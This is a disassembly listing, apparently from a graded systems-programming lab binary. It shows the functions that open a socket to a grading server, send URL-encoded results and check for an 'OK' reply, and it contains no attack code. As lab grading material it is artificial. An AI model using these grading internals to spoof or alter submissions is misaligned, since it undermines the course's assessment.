  40215f:	49 89 d7             	mov    %rdx,%r15
  402162:	49 89 ce             	mov    %rcx,%r14
  402165:	4c 89 44 24 08       	mov    %r8,0x8(%rsp)
  40216a:	4d 89 cd             	mov    %r9,%r13
  40216d:	48 8b 9c 24 80 a0 00 	mov    0xa080(%rsp),%rbx
  402174:	00 
  402175:	c7 84 24 1c 20 00 00 	movl   $0x0,0x201c(%rsp)
  40217c:	00 00 00 00 
  402180:	ba 00 00 00 00       	mov    $0x0,%edx
  402185:	be 01 00 00 00       	mov    $0x1,%esi
  40218a:	bf 02 00 00 00       	mov    $0x2,%edi
  40218f:	e8 7c ec ff ff       	callq  400e10 <socket@plt>
  402194:	89 c5                	mov    %eax,%ebp
  402196:	85 c0                	test   %eax,%eax
  402198:	79 4e                	jns    4021e8 <submitr+0xa1>
  40219a:	48 b8 45 72 72 6f 72 	movabs $0x43203a726f727245,%rax
  4021a1:	3a 20 43 
  4021a4:	48 89 03             	mov    %rax,(%rbx)
  4021a7:	48 b8 6c 69 65 6e 74 	movabs $0x6e7520746e65696c,%rax
  4021ae:	20 75 6e 
  4021b1:	48 89 43 08          	mov    %rax,0x8(%rbx)
  4021b5:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  4021bc:	74 6f 20 
  4021bf:	48 89 43 10          	mov    %rax,0x10(%rbx)
  4021c3:	48 b8 63 72 65 61 74 	movabs $0x7320657461657263,%rax
  4021ca:	65 20 73 
  4021cd:	48 89 43 18          	mov    %rax,0x18(%rbx)
  4021d1:	c7 43 20 6f 63 6b 65 	movl   $0x656b636f,0x20(%rbx)
  4021d8:	66 c7 43 24 74 00    	movw   $0x74,0x24(%rbx)
  4021de:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4021e3:	e9 68 06 00 00       	jmpq   402850 <submitr+0x709>
  4021e8:	4c 89 e7             	mov    %r12,%rdi
  4021eb:	e8 00 eb ff ff       	callq  400cf0 <gethostbyname@plt>
  4021f0:	48 85 c0             	test   %rax,%rax
  4021f3:	75 67                	jne    40225c <submitr+0x115>
  4021f5:	48 b8 45 72 72 6f 72 	movabs $0x44203a726f727245,%rax
  4021fc:	3a 20 44 
  4021ff:	48 89 03             	mov    %rax,(%rbx)
  402202:	48 b8 4e 53 20 69 73 	movabs $0x6e7520736920534e,%rax
  402209:	20 75 6e 
  40220c:	48 89 43 08          	mov    %rax,0x8(%rbx)
  402210:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  402217:	74 6f 20 
  40221a:	48 89 43 10          	mov    %rax,0x10(%rbx)
  40221e:	48 b8 72 65 73 6f 6c 	movabs $0x2065766c6f736572,%rax
  402225:	76 65 20 
  402228:	48 89 43 18          	mov    %rax,0x18(%rbx)
  40222c:	48 b8 73 65 72 76 65 	movabs $0x6120726576726573,%rax
  402233:	72 20 61 
  402236:	48 89 43 20          	mov    %rax,0x20(%rbx)
  40223a:	c7 43 28 64 64 72 65 	movl   $0x65726464,0x28(%rbx)
  402241:	66 c7 43 2c 73 73    	movw   $0x7373,0x2c(%rbx)
  402247:	c6 43 2e 00          	movb   $0x0,0x2e(%rbx)
  40224b:	89 ef                	mov    %ebp,%edi
  40224d:	e8 5e ea ff ff       	callq  400cb0 <close@plt>
  402252:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402257:	e9 f4 05 00 00       	jmpq   402850 <submitr+0x709>
  40225c:	48 c7 84 24 30 a0 00 	movq   $0x0,0xa030(%rsp)
  402263:	00 00 00 00 00 
  402268:	48 c7 84 24 38 a0 00 	movq   $0x0,0xa038(%rsp)
  40226f:	00 00 00 00 00 
  402274:	66 c7 84 24 30 a0 00 	movw   $0x2,0xa030(%rsp)
  40227b:	00 02 00 
  40227e:	48 8b 48 18          	mov    0x18(%rax),%rcx
  402282:	48 63 50 14          	movslq 0x14(%rax),%rdx
  402286:	48 8d b4 24 34 a0 00 	lea    0xa034(%rsp),%rsi
  40228d:	00 
  40228e:	48 8b 39             	mov    (%rcx),%rdi
  402291:	e8 fa ea ff ff       	callq  400d90 <bcopy@plt>
  402296:	0f b7 44 24 04       	movzwl 0x4(%rsp),%eax
  40229b:	66 c1 c8 08          	ror    $0x8,%ax
  40229f:	66 89 84 24 32 a0 00 	mov    %ax,0xa032(%rsp)
  4022a6:	00 
  4022a7:	ba 10 00 00 00       	mov    $0x10,%edx
  4022ac:	48 8d b4 24 30 a0 00 	lea    0xa030(%rsp),%rsi
  4022b3:	00 
  4022b4:	89 ef                	mov    %ebp,%edi
  4022b6:	e8 45 eb ff ff       	callq  400e00 <connect@plt>
  4022bb:	85 c0                	test   %eax,%eax
  4022bd:	79 59                	jns    402318 <submitr+0x1d1>
  4022bf:	48 b8 45 72 72 6f 72 	movabs $0x55203a726f727245,%rax
  4022c6:	3a 20 55 
  4022c9:	48 89 03             	mov    %rax,(%rbx)
  4022cc:	48 b8 6e 61 62 6c 65 	movabs $0x6f7420656c62616e,%rax
  4022d3:	20 74 6f 
  4022d6:	48 89 43 08          	mov    %rax,0x8(%rbx)
  4022da:	48 b8 20 63 6f 6e 6e 	movabs $0x7463656e6e6f6320,%rax
  4022e1:	65 63 74 
  4022e4:	48 89 43 10          	mov    %rax,0x10(%rbx)
  4022e8:	48 b8 20 74 6f 20 74 	movabs $0x20656874206f7420,%rax
  4022ef:	68 65 20 
  4022f2:	48 89 43 18          	mov    %rax,0x18(%rbx)
  4022f6:	c7 43 20 73 65 72 76 	movl   $0x76726573,0x20(%rbx)
  4022fd:	66 c7 43 24 65 72    	movw   $0x7265,0x24(%rbx)
  402303:	c6 43 26 00          	movb   $0x0,0x26(%rbx)
  402307:	89 ef                	mov    %ebp,%edi
  402309:	e8 a2 e9 ff ff       	callq  400cb0 <close@plt>
  40230e:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402313:	e9 38 05 00 00       	jmpq   402850 <submitr+0x709>
  402318:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
  40231f:	4c 89 ef             	mov    %r13,%rdi
  402322:	b8 00 00 00 00       	mov    $0x0,%eax
  402327:	48 89 d1             	mov    %rdx,%rcx
  40232a:	f2 ae                	repnz scas %es:(%rdi),%al
  40232c:	48 f7 d1             	not    %rcx
  40232f:	48 89 ce             	mov    %rcx,%rsi
  402332:	4c 89 ff             	mov    %r15,%rdi
  402335:	48 89 d1             	mov    %rdx,%rcx
  402338:	f2 ae                	repnz scas %es:(%rdi),%al
  40233a:	48 f7 d1             	not    %rcx
  40233d:	49 89 c8             	mov    %rcx,%r8
  402340:	4c 89 f7             	mov    %r14,%rdi
  402343:	48 89 d1             	mov    %rdx,%rcx
  402346:	f2 ae                	repnz scas %es:(%rdi),%al
  402348:	49 29 c8             	sub    %rcx,%r8
  40234b:	48 8b 7c 24 08       	mov    0x8(%rsp),%rdi
  402350:	48 89 d1             	mov    %rdx,%rcx
  402353:	f2 ae                	repnz scas %es:(%rdi),%al
  402355:	49 29 c8             	sub    %rcx,%r8
  402358:	48 8d 44 76 fd       	lea    -0x3(%rsi,%rsi,2),%rax
  40235d:	49 8d 44 00 7b       	lea    0x7b(%r8,%rax,1),%rax
  402362:	48 3d 00 20 00 00    	cmp    $0x2000,%rax
  402368:	76 72                	jbe    4023dc <submitr+0x295>
  40236a:	48 b8 45 72 72 6f 72 	movabs $0x52203a726f727245,%rax
  402371:	3a 20 52 
  402374:	48 89 03             	mov    %rax,(%rbx)
  402377:	48 b8 65 73 75 6c 74 	movabs $0x747320746c757365,%rax
  40237e:	20 73 74 
  402381:	48 89 43 08          	mov    %rax,0x8(%rbx)
  402385:	48 b8 72 69 6e 67 20 	movabs $0x6f6f7420676e6972,%rax
  40238c:	74 6f 6f 
  40238f:	48 89 43 10          	mov    %rax,0x10(%rbx)
  402393:	48 b8 20 6c 61 72 67 	movabs $0x202e656772616c20,%rax
  40239a:	65 2e 20 
  40239d:	48 89 43 18          	mov    %rax,0x18(%rbx)
  4023a1:	48 b8 49 6e 63 72 65 	movabs $0x6573616572636e49,%rax
  4023a8:	61 73 65 
  4023ab:	48 89 43 20          	mov    %rax,0x20(%rbx)
  4023af:	48 b8 20 53 55 42 4d 	movabs $0x5254494d42555320,%rax
  4023b6:	49 54 52 
  4023b9:	48 89 43 28          	mov    %rax,0x28(%rbx)
  4023bd:	48 b8 5f 4d 41 58 42 	movabs $0x46554258414d5f,%rax
  4023c4:	55 46 00 
  4023c7:	48 89 43 30          	mov    %rax,0x30(%rbx)
  4023cb:	89 ef                	mov    %ebp,%edi
  4023cd:	e8 de e8 ff ff       	callq  400cb0 <close@plt>
  4023d2:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4023d7:	e9 74 04 00 00       	jmpq   402850 <submitr+0x709>
  4023dc:	48 8d b4 24 20 40 00 	lea    0x4020(%rsp),%rsi
  4023e3:	00 
  4023e4:	b9 00 04 00 00       	mov    $0x400,%ecx
  4023e9:	b8 00 00 00 00       	mov    $0x0,%eax
  4023ee:	48 89 f7             	mov    %rsi,%rdi
  4023f1:	f3 48 ab             	rep stos %rax,%es:(%rdi)
  4023f4:	4c 89 ef             	mov    %r13,%rdi
  4023f7:	e8 0f fb ff ff       	callq  401f0b <urlencode>
  4023fc:	85 c0                	test   %eax,%eax
  4023fe:	0f 89 8a 00 00 00    	jns    40248e <submitr+0x347>
  402404:	48 b8 45 72 72 6f 72 	movabs $0x52203a726f727245,%rax
  40240b:	3a 20 52 
  40240e:	48 89 03             	mov    %rax,(%rbx)
  402411:	48 b8 65 73 75 6c 74 	movabs $0x747320746c757365,%rax
  402418:	20 73 74 
  40241b:	48 89 43 08          	mov    %rax,0x8(%rbx)
  40241f:	48 b8 72 69 6e 67 20 	movabs $0x6e6f6320676e6972,%rax
  402426:	63 6f 6e 
  402429:	48 89 43 10          	mov    %rax,0x10(%rbx)
  40242d:	48 b8 74 61 69 6e 73 	movabs $0x6e6120736e696174,%rax
  402434:	20 61 6e 
  402437:	48 89 43 18          	mov    %rax,0x18(%rbx)
  40243b:	48 b8 20 69 6c 6c 65 	movabs $0x6c6167656c6c6920,%rax
  402442:	67 61 6c 
  402445:	48 89 43 20          	mov    %rax,0x20(%rbx)
  402449:	48 b8 20 6f 72 20 75 	movabs $0x72706e7520726f20,%rax
  402450:	6e 70 72 
  402453:	48 89 43 28          	mov    %rax,0x28(%rbx)
  402457:	48 b8 69 6e 74 61 62 	movabs $0x20656c6261746e69,%rax
  40245e:	6c 65 20 
  402461:	48 89 43 30          	mov    %rax,0x30(%rbx)
  402465:	48 b8 63 68 61 72 61 	movabs $0x6574636172616863,%rax
  40246c:	63 74 65 
  40246f:	48 89 43 38          	mov    %rax,0x38(%rbx)
  402473:	66 c7 43 40 72 2e    	movw   $0x2e72,0x40(%rbx)
  402479:	c6 43 42 00          	movb   $0x0,0x42(%rbx)
  40247d:	89 ef                	mov    %ebp,%edi
  40247f:	e8 2c e8 ff ff       	callq  400cb0 <close@plt>
  402484:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402489:	e9 c2 03 00 00       	jmpq   402850 <submitr+0x709>
  40248e:	4d 89 e1             	mov    %r12,%r9
  402491:	4c 8d 84 24 20 40 00 	lea    0x4020(%rsp),%r8
  402498:	00 
  402499:	4c 89 f9             	mov    %r15,%rcx
  40249c:	4c 89 f2             	mov    %r14,%rdx
  40249f:	be f8 33 40 00       	mov    $0x4033f8,%esi
  4024a4:	48 8d bc 24 20 60 00 	lea    0x6020(%rsp),%rdi
  4024ab:	00 
  4024ac:	b8 00 00 00 00       	mov    $0x0,%eax
  4024b1:	e8 2a e9 ff ff       	callq  400de0 <sprintf@plt>
  4024b6:	48 8d bc 24 20 60 00 	lea    0x6020(%rsp),%rdi
  4024bd:	00 
  4024be:	b8 00 00 00 00       	mov    $0x0,%eax
  4024c3:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
  4024ca:	f2 ae                	repnz scas %es:(%rdi),%al
  4024cc:	48 f7 d1             	not    %rcx
  4024cf:	48 8d 51 ff          	lea    -0x1(%rcx),%rdx
  4024d3:	48 8d b4 24 20 60 00 	lea    0x6020(%rsp),%rsi
  4024da:	00 
  4024db:	89 ef                	mov    %ebp,%edi
  4024dd:	e8 ff fa ff ff       	callq  401fe1 <rio_writen>
  4024e2:	48 85 c0             	test   %rax,%rax
  4024e5:	79 6e                	jns    402555 <submitr+0x40e>
  4024e7:	48 b8 45 72 72 6f 72 	movabs $0x43203a726f727245,%rax
  4024ee:	3a 20 43 
  4024f1:	48 89 03             	mov    %rax,(%rbx)
  4024f4:	48 b8 6c 69 65 6e 74 	movabs $0x6e7520746e65696c,%rax
  4024fb:	20 75 6e 
  4024fe:	48 89 43 08          	mov    %rax,0x8(%rbx)
  402502:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  402509:	74 6f 20 
  40250c:	48 89 43 10          	mov    %rax,0x10(%rbx)
  402510:	48 b8 77 72 69 74 65 	movabs $0x6f74206574697277,%rax
  402517:	20 74 6f 
  40251a:	48 89 43 18          	mov    %rax,0x18(%rbx)
  40251e:	48 b8 20 74 68 65 20 	movabs $0x7365722065687420,%rax
  402525:	72 65 73 
  402528:	48 89 43 20          	mov    %rax,0x20(%rbx)
  40252c:	48 b8 75 6c 74 20 73 	movabs $0x7672657320746c75,%rax
  402533:	65 72 76 
  402536:	48 89 43 28          	mov    %rax,0x28(%rbx)
  40253a:	66 c7 43 30 65 72    	movw   $0x7265,0x30(%rbx)
  402540:	c6 43 32 00          	movb   $0x0,0x32(%rbx)
  402544:	89 ef                	mov    %ebp,%edi
  402546:	e8 65 e7 ff ff       	callq  400cb0 <close@plt>
  40254b:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402550:	e9 fb 02 00 00       	jmpq   402850 <submitr+0x709>
  402555:	89 ee                	mov    %ebp,%esi
  402557:	48 8d bc 24 20 80 00 	lea    0x8020(%rsp),%rdi
  40255e:	00 
  40255f:	e8 6c f9 ff ff       	callq  401ed0 <rio_readinitb>
  402564:	ba 00 20 00 00       	mov    $0x2000,%edx
  402569:	48 8d b4 24 20 60 00 	lea    0x6020(%rsp),%rsi
  402570:	00 
  402571:	48 8d bc 24 20 80 00 	lea    0x8020(%rsp),%rdi
  402578:	00 
  402579:	e8 46 fb ff ff       	callq  4020c4 <rio_readlineb>
  40257e:	48 85 c0             	test   %rax,%rax
  402581:	7f 7d                	jg     402600 <submitr+0x4b9>
  402583:	48 b8 45 72 72 6f 72 	movabs $0x43203a726f727245,%rax
  40258a:	3a 20 43 
  40258d:	48 89 03             	mov    %rax,(%rbx)
  402590:	48 b8 6c 69 65 6e 74 	movabs $0x6e7520746e65696c,%rax
  402597:	20 75 6e 
  40259a:	48 89 43 08          	mov    %rax,0x8(%rbx)
  40259e:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  4025a5:	74 6f 20 
  4025a8:	48 89 43 10          	mov    %rax,0x10(%rbx)
  4025ac:	48 b8 72 65 61 64 20 	movabs $0x7269662064616572,%rax
  4025b3:	66 69 72 
  4025b6:	48 89 43 18          	mov    %rax,0x18(%rbx)
  4025ba:	48 b8 73 74 20 68 65 	movabs $0x6564616568207473,%rax
  4025c1:	61 64 65 
  4025c4:	48 89 43 20          	mov    %rax,0x20(%rbx)
  4025c8:	48 b8 72 20 66 72 6f 	movabs $0x72206d6f72662072,%rax
  4025cf:	6d 20 72 
  4025d2:	48 89 43 28          	mov    %rax,0x28(%rbx)
  4025d6:	48 b8 65 73 75 6c 74 	movabs $0x657320746c757365,%rax
  4025dd:	20 73 65 
  4025e0:	48 89 43 30          	mov    %rax,0x30(%rbx)
  4025e4:	c7 43 38 72 76 65 72 	movl   $0x72657672,0x38(%rbx)
  4025eb:	c6 43 3c 00          	movb   $0x0,0x3c(%rbx)
  4025ef:	89 ef                	mov    %ebp,%edi
  4025f1:	e8 ba e6 ff ff       	callq  400cb0 <close@plt>
  4025f6:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4025fb:	e9 50 02 00 00       	jmpq   402850 <submitr+0x709>
  402600:	4c 8d 44 24 10       	lea    0x10(%rsp),%r8
  402605:	48 8d 8c 24 1c 20 00 	lea    0x201c(%rsp),%rcx
  40260c:	00 
  40260d:	48 8d 94 24 20 20 00 	lea    0x2020(%rsp),%rdx
  402614:	00 
  402615:	be 6f 34 40 00       	mov    $0x40346f,%esi
  40261a:	48 8d bc 24 20 60 00 	lea    0x6020(%rsp),%rdi
  402621:	00 
  402622:	b8 00 00 00 00       	mov    $0x0,%eax
  402627:	e8 44 e7 ff ff       	callq  400d70 <__isoc99_sscanf@plt>
  40262c:	e9 98 00 00 00       	jmpq   4026c9 <submitr+0x582>
  402631:	ba 00 20 00 00       	mov    $0x2000,%edx
  402636:	48 8d b4 24 20 60 00 	lea    0x6020(%rsp),%rsi
  40263d:	00 
  40263e:	48 8d bc 24 20 80 00 	lea    0x8020(%rsp),%rdi
  402645:	00 
  402646:	e8 79 fa ff ff       	callq  4020c4 <rio_readlineb>
  40264b:	48 85 c0             	test   %rax,%rax
  40264e:	7f 79                	jg     4026c9 <submitr+0x582>
  402650:	48 b8 45 72 72 6f 72 	movabs $0x43203a726f727245,%rax
  402657:	3a 20 43 
  40265a:	48 89 03             	mov    %rax,(%rbx)
  40265d:	48 b8 6c 69 65 6e 74 	movabs $0x6e7520746e65696c,%rax
  402664:	20 75 6e 
  402667:	48 89 43 08          	mov    %rax,0x8(%rbx)
  40266b:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  402672:	74 6f 20 
  402675:	48 89 43 10          	mov    %rax,0x10(%rbx)
  402679:	48 b8 72 65 61 64 20 	movabs $0x6165682064616572,%rax
  402680:	68 65 61 
  402683:	48 89 43 18          	mov    %rax,0x18(%rbx)
  402687:	48 b8 64 65 72 73 20 	movabs $0x6f72662073726564,%rax
  40268e:	66 72 6f 
  402691:	48 89 43 20          	mov    %rax,0x20(%rbx)
  402695:	48 b8 6d 20 74 68 65 	movabs $0x657220656874206d,%rax
  40269c:	20 72 65 
  40269f:	48 89 43 28          	mov    %rax,0x28(%rbx)
  4026a3:	48 b8 73 75 6c 74 20 	movabs $0x72657320746c7573,%rax
  4026aa:	73 65 72 
  4026ad:	48 89 43 30          	mov    %rax,0x30(%rbx)
  4026b1:	c7 43 38 76 65 72 00 	movl   $0x726576,0x38(%rbx)
  4026b8:	89 ef                	mov    %ebp,%edi
  4026ba:	e8 f1 e5 ff ff       	callq  400cb0 <close@plt>
  4026bf:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4026c4:	e9 87 01 00 00       	jmpq   402850 <submitr+0x709>
  4026c9:	0f b6 84 24 20 60 00 	movzbl 0x6020(%rsp),%eax
  4026d0:	00 
  4026d1:	83 e8 0d             	sub    $0xd,%eax
  4026d4:	75 15                	jne    4026eb <submitr+0x5a4>
  4026d6:	0f b6 84 24 21 60 00 	movzbl 0x6021(%rsp),%eax
  4026dd:	00 
  4026de:	83 e8 0a             	sub    $0xa,%eax
  4026e1:	75 08                	jne    4026eb <submitr+0x5a4>
  4026e3:	0f b6 84 24 22 60 00 	movzbl 0x6022(%rsp),%eax
  4026ea:	00 
  4026eb:	85 c0                	test   %eax,%eax
  4026ed:	0f 85 3e ff ff ff    	jne    402631 <submitr+0x4ea>
  4026f3:	ba 00 20 00 00       	mov    $0x2000,%edx
  4026f8:	48 8d b4 24 20 60 00 	lea    0x6020(%rsp),%rsi
  4026ff:	00 
  402700:	48 8d bc 24 20 80 00 	lea    0x8020(%rsp),%rdi
  402707:	00 
  402708:	e8 b7 f9 ff ff       	callq  4020c4 <rio_readlineb>
  40270d:	48 85 c0             	test   %rax,%rax
  402710:	0f 8f 83 00 00 00    	jg     402799 <submitr+0x652>
  402716:	48 b8 45 72 72 6f 72 	movabs $0x43203a726f727245,%rax
  40271d:	3a 20 43 
  402720:	48 89 03             	mov    %rax,(%rbx)
  402723:	48 b8 6c 69 65 6e 74 	movabs $0x6e7520746e65696c,%rax
  40272a:	20 75 6e 
  40272d:	48 89 43 08          	mov    %rax,0x8(%rbx)
  402731:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  402738:	74 6f 20 
  40273b:	48 89 43 10          	mov    %rax,0x10(%rbx)
  40273f:	48 b8 72 65 61 64 20 	movabs $0x6174732064616572,%rax
  402746:	73 74 61 
  402749:	48 89 43 18          	mov    %rax,0x18(%rbx)
  40274d:	48 b8 74 75 73 20 6d 	movabs $0x7373656d20737574,%rax
  402754:	65 73 73 
  402757:	48 89 43 20          	mov    %rax,0x20(%rbx)
  40275b:	48 b8 61 67 65 20 66 	movabs $0x6d6f726620656761,%rax
  402762:	72 6f 6d 
  402765:	48 89 43 28          	mov    %rax,0x28(%rbx)
  402769:	48 b8 20 72 65 73 75 	movabs $0x20746c7573657220,%rax
  402770:	6c 74 20 
  402773:	48 89 43 30          	mov    %rax,0x30(%rbx)
  402777:	c7 43 38 73 65 72 76 	movl   $0x76726573,0x38(%rbx)
  40277e:	66 c7 43 3c 65 72    	movw   $0x7265,0x3c(%rbx)
  402784:	c6 43 3e 00          	movb   $0x0,0x3e(%rbx)
  402788:	89 ef                	mov    %ebp,%edi
  40278a:	e8 21 e5 ff ff       	callq  400cb0 <close@plt>
  40278f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402794:	e9 b7 00 00 00       	jmpq   402850 <submitr+0x709>
  402799:	8b 94 24 1c 20 00 00 	mov    0x201c(%rsp),%edx
  4027a0:	81 fa c8 00 00 00    	cmp    $0xc8,%edx
  4027a6:	74 28                	je     4027d0 <submitr+0x689>
  4027a8:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
  4027ad:	be 38 34 40 00       	mov    $0x403438,%esi
  4027b2:	48 89 df             	mov    %rbx,%rdi
  4027b5:	b8 00 00 00 00       	mov    $0x0,%eax
  4027ba:	e8 21 e6 ff ff       	callq  400de0 <sprintf@plt>
  4027bf:	89 ef                	mov    %ebp,%edi
  4027c1:	e8 ea e4 ff ff       	callq  400cb0 <close@plt>
  4027c6:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4027cb:	e9 80 00 00 00       	jmpq   402850 <submitr+0x709>
  4027d0:	48 8d b4 24 20 60 00 	lea    0x6020(%rsp),%rsi
  4027d7:	00 
  4027d8:	48 89 df             	mov    %rbx,%rdi
  4027db:	e8 60 e4 ff ff       	callq  400c40 <strcpy@plt>
  4027e0:	89 ef                	mov    %ebp,%edi
  4027e2:	e8 c9 e4 ff ff       	callq  400cb0 <close@plt>
  4027e7:	0f b6 03             	movzbl (%rbx),%eax
  4027ea:	83 e8 4f             	sub    $0x4f,%eax
  4027ed:	75 18                	jne    402807 <submitr+0x6c0>
  4027ef:	0f b6 53 01          	movzbl 0x1(%rbx),%edx
  4027f3:	83 ea 4b             	sub    $0x4b,%edx
  4027f6:	75 11                	jne    402809 <submitr+0x6c2>
  4027f8:	0f b6 53 02          	movzbl 0x2(%rbx),%edx
  4027fc:	83 ea 0a             	sub    $0xa,%edx
  4027ff:	75 08                	jne    402809 <submitr+0x6c2>
  402801:	0f b6 53 03          	movzbl 0x3(%rbx),%edx
  402805:	eb 02                	jmp    402809 <submitr+0x6c2>
  402807:	89 c2                	mov    %eax,%edx
  402809:	85 d2                	test   %edx,%edx
  40280b:	74 30                	je     40283d <submitr+0x6f6>
  40280d:	bf 80 34 40 00       	mov    $0x403480,%edi
  402812:	b9 05 00 00 00       	mov    $0x5,%ecx
  402817:	48 89 de             	mov    %rbx,%rsi
  40281a:	f3 a6                	repz cmpsb %es:(%rdi),%ds:(%rsi)
  40281c:	0f 97 c1             	seta   %cl
  40281f:	0f 92 c2             	setb   %dl
  402822:	38 d1                	cmp    %dl,%cl
  402824:	74 1e                	je     402844 <submitr+0x6fd>
  402826:	85 c0                	test   %eax,%eax
  402828:	75 0d                	jne    402837 <submitr+0x6f0>
  40282a:	0f b6 43 01          	movzbl 0x1(%rbx),%eax
  40282e:	83 e8 4b             	sub    $0x4b,%eax
  402831:	75 04                	jne    402837 <submitr+0x6f0>
  402833:	0f b6 43 02          	movzbl 0x2(%rbx),%eax
  402837:	85 c0                	test   %eax,%eax
  402839:	75 10                	jne    40284b <submitr+0x704>
  40283b:	eb 13                	jmp    402850 <submitr+0x709>
  40283d:	b8 00 00 00 00       	mov    $0x0,%eax
  402842:	eb 0c                	jmp    402850 <submitr+0x709>
  402844:	b8 00 00 00 00       	mov    $0x0,%eax
  402849:	eb 05                	jmp    402850 <submitr+0x709>
  40284b:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402850:	48 81 c4 48 a0 00 00 	add    $0xa048,%rsp
  402857:	5b                   	pop    %rbx
  402858:	5d                   	pop    %rbp
  402859:	41 5c                	pop    %r12
  40285b:	41 5d                	pop    %r13
  40285d:	41 5e                	pop    %r14
  40285f:	41 5f                	pop    %r15
  402861:	c3                   	retq   

0000000000402862 <init_timeout>:
  402862:	53                   	push   %rbx
  402863:	89 fb                	mov    %edi,%ebx
  402865:	85 ff                	test   %edi,%edi
  402867:	74 1f                	je     402888 <init_timeout+0x26>
  402869:	85 ff                	test   %edi,%edi
  40286b:	79 05                	jns    402872 <init_timeout+0x10>
  40286d:	bb 00 00 00 00       	mov    $0x0,%ebx
  402872:	be e2 1e 40 00       	mov    $0x401ee2,%esi
  402877:	bf 0e 00 00 00       	mov    $0xe,%edi
  40287c:	e8 5f e4 ff ff       	callq  400ce0 <signal@plt>
  402881:	89 df                	mov    %ebx,%edi
  402883:	e8 18 e4 ff ff       	callq  400ca0 <alarm@plt>
  402888:	5b                   	pop    %rbx
  402889:	c3                   	retq   

000000000040288a <init_driver>:
  40288a:	55                   	push   %rbp
  40288b:	53                   	push   %rbx
  40288c:	48 83 ec 18          	sub    $0x18,%rsp
  402890:	48 89 fd             	mov    %rdi,%rbp
  402893:	be 01 00 00 00       	mov    $0x1,%esi
  402898:	bf 0d 00 00 00       	mov    $0xd,%edi
  40289d:	e8 3e e4 ff ff       	callq  400ce0 <signal@plt>
  4028a2:	be 01 00 00 00       	mov    $0x1,%esi
  4028a7:	bf 1d 00 00 00       	mov    $0x1d,%edi
  4028ac:	e8 2f e4 ff ff       	callq  400ce0 <signal@plt>
  4028b1:	be 01 00 00 00       	mov    $0x1,%esi
  4028b6:	bf 1d 00 00 00       	mov    $0x1d,%edi
  4028bb:	e8 20 e4 ff ff       	callq  400ce0 <signal@plt>
  4028c0:	ba 00 00 00 00       	mov    $0x0,%edx
  4028c5:	be 01 00 00 00       	mov    $0x1,%esi
  4028ca:	bf 02 00 00 00       	mov    $0x2,%edi
  4028cf:	e8 3c e5 ff ff       	callq  400e10 <socket@plt>
  4028d4:	89 c3                	mov    %eax,%ebx
  4028d6:	85 c0                	test   %eax,%eax
  4028d8:	79 4f                	jns    402929 <init_driver+0x9f>
  4028da:	48 b8 45 72 72 6f 72 	movabs $0x43203a726f727245,%rax
  4028e1:	3a 20 43 
  4028e4:	48 89 45 00          	mov    %rax,0x0(%rbp)
  4028e8:	48 b8 6c 69 65 6e 74 	movabs $0x6e7520746e65696c,%rax
  4028ef:	20 75 6e 
  4028f2:	48 89 45 08          	mov    %rax,0x8(%rbp)
  4028f6:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  4028fd:	74 6f 20 
  402900:	48 89 45 10          	mov    %rax,0x10(%rbp)
  402904:	48 b8 63 72 65 61 74 	movabs $0x7320657461657263,%rax
  40290b:	65 20 73 
  40290e:	48 89 45 18          	mov    %rax,0x18(%rbp)
  402912:	c7 45 20 6f 63 6b 65 	movl   $0x656b636f,0x20(%rbp)
  402919:	66 c7 45 24 74 00    	movw   $0x74,0x24(%rbp)
  40291f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402924:	e9 23 01 00 00       	jmpq   402a4c <init_driver+0x1c2>
  402929:	bf c8 2e 40 00       	mov    $0x402ec8,%edi
  40292e:	e8 bd e3 ff ff       	callq  400cf0 <gethostbyname@plt>
  402933:	48 85 c0             	test   %rax,%rax
  402936:	75 68                	jne    4029a0 <init_driver+0x116>
  402938:	48 b8 45 72 72 6f 72 	movabs $0x44203a726f727245,%rax
  40293f:	3a 20 44 
  402942:	48 89 45 00          	mov    %rax,0x0(%rbp)
  402946:	48 b8 4e 53 20 69 73 	movabs $0x6e7520736920534e,%rax
  40294d:	20 75 6e 
  402950:	48 89 45 08          	mov    %rax,0x8(%rbp)
  402954:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  40295b:	74 6f 20 
  40295e:	48 89 45 10          	mov    %rax,0x10(%rbp)
  402962:	48 b8 72 65 73 6f 6c 	movabs $0x2065766c6f736572,%rax
  402969:	76 65 20 
  40296c:	48 89 45 18          	mov    %rax,0x18(%rbp)
  402970:	48 b8 73 65 72 76 65 	movabs $0x6120726576726573,%rax
  402977:	72 20 61 
  40297a:	48 89 45 20          	mov    %rax,0x20(%rbp)
  40297e:	c7 45 28 64 64 72 65 	movl   $0x65726464,0x28(%rbp)
  402985:	66 c7 45 2c 73 73    	movw   $0x7373,0x2c(%rbp)
  40298b:	c6 45 2e 00          	movb   $0x0,0x2e(%rbp)
  40298f:	89 df                	mov    %ebx,%edi
  402991:	e8 1a e3 ff ff       	callq  400cb0 <close@plt>
  402996:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40299b:	e9 ac 00 00 00       	jmpq   402a4c <init_driver+0x1c2>
  4029a0:	48 c7 04 24 00 00 00 	movq   $0x0,(%rsp)
  4029a7:	00 
  4029a8:	48 c7 44 24 08 00 00 	movq   $0x0,0x8(%rsp)
  4029af:	00 00 
  4029b1:	66 c7 04 24 02 00    	movw   $0x2,(%rsp)
